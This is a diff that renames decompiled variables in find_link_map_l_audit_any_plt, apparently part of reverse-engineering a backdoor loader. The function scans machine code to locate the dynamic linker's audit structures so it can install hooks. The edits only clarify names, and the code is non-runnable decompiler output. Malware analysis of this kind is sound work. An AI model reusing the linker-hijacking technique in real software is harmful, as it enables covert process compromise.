@@ -21,34 +21,34 @@ BOOL find_link_map_l_audit_any_plt
 {
   libc_imports_t *libc_imports;
   u32 register_mask_snapshot;
-  u64 uVar3;
+  u64 insn_size;
   BOOL success;
   lzma_allocator *allocator;
   pfn_write_t write_stub;
   pfn_pselect_t pselect_stub;
-  long lVar7;
+  long clear_idx;
   uchar lea_target_reg;
   dl_audit_symbind_alt_fn audit_cursor;
   u8 *lea_disp;
-  dasm_ctx_t *pdVar10;
-  instruction_search_ctx_t *piVar11;
-  undefined4 *puVar12;
+  dasm_ctx_t *zero_ctx_cursor;
+  instruction_search_ctx_t *search_ctx_cursor;
+  undefined4 *offset_clear_cursor;
   uchar mask_register;
   dl_audit_symbind_alt_fn audit_end;
-  byte bVar14;
+  u8 zero_seed;
   undefined4 local_c8;
   undefined4 local_c4;
   instruction_search_ctx_t local_c0;
   dasm_ctx_t local_80;
   
-  bVar14 = 0;
+  zero_seed = 0;
   success = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x85,0x12,8,FALSE);
   if (success != FALSE) {
     libc_imports = imported_funcs->libc;
-    pdVar10 = &local_80;
-    for (lVar7 = 0x16; lVar7 != 0; lVar7 = lVar7 + -1) {
-      *(undefined4 *)&pdVar10->instruction = 0;
-      pdVar10 = (dasm_ctx_t *)((long)pdVar10 + (ulong)bVar14 * -8 + 4);
+    zero_ctx_cursor = &local_80;
+    for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
+      *(undefined4 *)&zero_ctx_cursor->instruction = 0;
+      zero_ctx_cursor = (dasm_ctx_t *)((long)zero_ctx_cursor + (ulong)zero_seed * -8 + 4);
     }
     local_c8 = 0;
     local_c4 = 0;
@@ -74,7 +74,7 @@ BOOL find_link_map_l_audit_any_plt
     }
     while ((audit_cursor < audit_end &&
            (success = x86_dasm(&local_80,(u8 *)audit_cursor,(u8 *)audit_end),
-           uVar3 = local_80.instruction_size, success != FALSE))) {
+           insn_size = local_80.instruction_size, success != FALSE))) {
       if ((local_80._40_4_ == 0x1036) &&
          ((((ushort)local_80.prefix._0_4_ & 0x140) == 0x140 &&
           ((byte)(local_80.prefix._13_1_ - 1) < 2)))) {
@@ -109,33 +109,33 @@ BOOL find_link_map_l_audit_any_plt
             lea_disp = local_80.instruction + (long)(local_80.mem_disp + local_80.instruction_size);
           }
           if ((lea_disp < (ulong)libname_offset) && (lea_disp != (u8 *)0x0)) {
-            piVar11 = &local_c0;
-            for (lVar7 = 0x10; lVar7 != 0; lVar7 = lVar7 + -1) {
-              *(undefined4 *)&piVar11->start_addr = 0;
-              piVar11 = (instruction_search_ctx_t *)((long)piVar11 + (ulong)bVar14 * -8 + 4);
+            search_ctx_cursor = &local_c0;
+            for (clear_idx = 0x10; clear_idx != 0; clear_idx = clear_idx + -1) {
+              *(undefined4 *)&search_ctx_cursor->start_addr = 0;
+              search_ctx_cursor = (instruction_search_ctx_t *)((long)search_ctx_cursor + (ulong)zero_seed * -8 + 4);
             }
             if (((int)(local_c8 & 0xffff) >> (mask_register & 0x1f) & 1U) == 0) {
               if (((int)(local_c4 & 0xffff) >> (mask_register & 0x1f) & 1U) == 0) goto LAB_00104fd8;
               local_c4._0_3_ = CONCAT12(lea_target_reg,(ushort)local_c4);
-              puVar12 = (undefined4 *)((long)&local_c0.offset_to_match + 4);
-              for (lVar7 = 7; lVar7 != 0; lVar7 = lVar7 + -1) {
-                *puVar12 = 0;
-                puVar12 = puVar12 + (ulong)bVar14 * -2 + 1;
+              offset_clear_cursor = (undefined4 *)((long)&local_c0.offset_to_match + 4);
+              for (clear_idx = 7; clear_idx != 0; clear_idx = clear_idx + -1) {
+                *offset_clear_cursor = 0;
+                offset_clear_cursor = offset_clear_cursor + (ulong)zero_seed * -2 + 1;
               }
               local_c0.output_register_to_match = &local_c4;
               local_c0.output_register = (u8 *)&local_c8;
             }
             else {
               local_c8._0_3_ = CONCAT12(lea_target_reg,(undefined2)local_c8);
-              puVar12 = (undefined4 *)((long)&local_c0.offset_to_match + 4);
-              for (lVar7 = 7; lVar7 != 0; lVar7 = lVar7 + -1) {
-                *puVar12 = 0;
-                puVar12 = puVar12 + (ulong)bVar14 * -2 + 1;
+              offset_clear_cursor = (undefined4 *)((long)&local_c0.offset_to_match + 4);
+              for (clear_idx = 7; clear_idx != 0; clear_idx = clear_idx + -1) {
+                *offset_clear_cursor = 0;
+                offset_clear_cursor = offset_clear_cursor + (ulong)zero_seed * -2 + 1;
               }
               local_c0.output_register_to_match = &local_c8;
               local_c0.output_register = (u8 *)&local_c4;
             }
-            local_c0.start_addr = (u8 *)(audit_cursor + uVar3);
+            local_c0.start_addr = (u8 *)(audit_cursor + insn_size);
             local_c0.end_addr = (u8 *)audit_end;
             local_c0.offset_to_match._0_4_ = (int)lea_disp;
             local_c0.hooks = hooks;
